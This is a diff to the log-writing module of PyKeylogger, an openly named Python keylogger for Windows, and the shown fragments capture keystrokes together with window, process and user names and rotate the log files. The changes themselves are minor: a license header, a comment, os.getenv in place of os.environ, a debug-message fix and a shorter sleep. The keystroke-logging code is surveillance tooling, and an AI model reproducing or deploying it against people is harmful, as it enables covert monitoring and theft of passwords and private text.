@@ -1,3 +1,25 @@
+##############################################################################
+##
+## PyKeylogger: Simple Python Keylogger for Windows
+## Copyright (C) 2007  nanotube@users.sf.net
+##
+## http://pykeylogger.sourceforge.net/
+##
+## This program is free software; you can redistribute it and/or
+## modify it under the terms of the GNU General Public License
+## as published by the Free Software Foundation; either version 3
+## of the License, or (at your option) any later version.
+##
+## This program is distributed in the hope that it will be useful,
+## but WITHOUT ANY WARRANTY; without even the implied warranty of
+## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+## GNU General Public License for more details.
+##
+## You should have received a copy of the GNU General Public License
+## along with this program.  If not, see <http://www.gnu.org/licenses/>.
+##
+##############################################################################
+
 import win32api, win32con, win32process
 import os, os.path
 import time
@@ -79,6 +101,7 @@ class LogWriter:
 		# initialize self.log to None, so that we dont attempt to flush it until it exists, and so we know to open it when it's closed.
 		self.log = None
 		
+		## don't even need this anymore?
 		# Set up the subset of keys that we are going to log
 		self.asciiSubset = [8,9,10,13,27]		   #backspace, tab, line feed, carriage return, escape
 		self.asciiSubset.extend(range(32,255))	  #all normal printable chars
@@ -162,7 +185,7 @@ class LogWriter:
 								time.strftime('%H%M'), 
 								self.GetProcessNameFromHwnd(event.Window), 
 								event.Window, 
-								os.environ['USERNAME'], 
+								os.getenv('USERNAME'), 
 								str(event.WindowName), 
 								self.ParseEventValue(event)]
 				if self.eventlist[0:6] == eventlisttmp[0:6]:
@@ -594,7 +617,7 @@ class LogWriter:
 		
 		if self.log != None:
 			rotateTarget = os.path.join(os.path.normpath(self.settings['General']['Log Directory']), os.path.normpath(time.strftime("%Y%m%d_%H%M%S") + '_' + self.settings['General']['Log File']))
-			self.PrintDebug("\nRenaming\n" + self.writeTarget + "\nto" + rotateTarget + "\n")
+			self.PrintDebug("\nRenaming\n" + self.writeTarget + "\nto\n" + rotateTarget + "\n")
 			self.log.close()
 			self.log = None
 			try:
@@ -652,7 +675,7 @@ class LogWriter:
 		'''To exit cleanly, flush all write buffers, and stop all running timers.
 		'''
 		self.stopflag = True
-		time.sleep(3)
+		time.sleep(2.5)
 		self.queuetimer.cancel()
 		
 		self.WriteToLogFile()
